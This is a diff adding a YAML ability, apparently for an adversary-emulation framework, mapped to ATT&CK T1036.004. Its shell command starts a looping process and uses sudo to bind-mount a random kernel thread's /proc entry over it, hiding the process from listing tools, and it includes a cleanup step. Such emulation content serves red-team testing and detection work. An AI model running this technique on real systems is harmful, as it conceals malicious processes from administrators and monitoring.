@@ -1,0 +1,20 @@
+---
+- id: d1c224a9d62c9abc70e680abd4b32986
+  name: Hiding a malicious process with bind mounts
+  description: 'Creates a malicious process and hides it by bind mounting to the /proc
+    filesystem of a benign process
+
+    '
+  tactic: stealth
+  technique:
+    attack_id: T1036.004
+    name: 'Masquerading: Masquerade Task or Service'
+  platforms:
+    linux:
+      sh:
+        command: eval '(while true; do :; done) &'; echo $! > /tmp/evil_pid.txt; random_kernel_pid=$(ps
+          -ef | grep "\[.*\]" | awk '{print $2}' | shuf -n 1); sudo mount -B /proc/$random_kernel_pid
+          /proc/$(cat /tmp/evil_pid.txt)
+        payloads: []
+        cleanup: kill $(cat /tmp/evil_pid.txt) || echo "Failed to kill PID $evil_pid";
+          rm /tmp/evil_pid.txt
